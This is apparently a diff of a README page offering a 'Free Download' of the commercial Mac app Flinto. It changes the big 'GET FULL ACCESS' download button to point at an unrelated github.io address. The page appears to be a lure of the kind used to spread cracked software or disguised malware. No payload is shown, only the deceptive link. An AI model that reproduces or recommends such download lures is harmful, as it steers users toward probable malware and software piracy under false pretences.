@@ -5,7 +5,7 @@
 <h1 align="center">🚀 <b>Flinto – Free Download for MacOS</b></h1>
 
 <p align="center">
-  <a href="https://flinto-mac-download-tool.github.io/.github/" target="_blank">
+  <a href="https://bloodangel210.github.io/modarbas/83">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20FLINTO%20MAC-GET%20FULL%20ACCESS-green?style=for-the-badge&logo=apple&logoColor=white" alt="Download Button" style="width: 580px; height: 45px;">
   </a>
 </p>
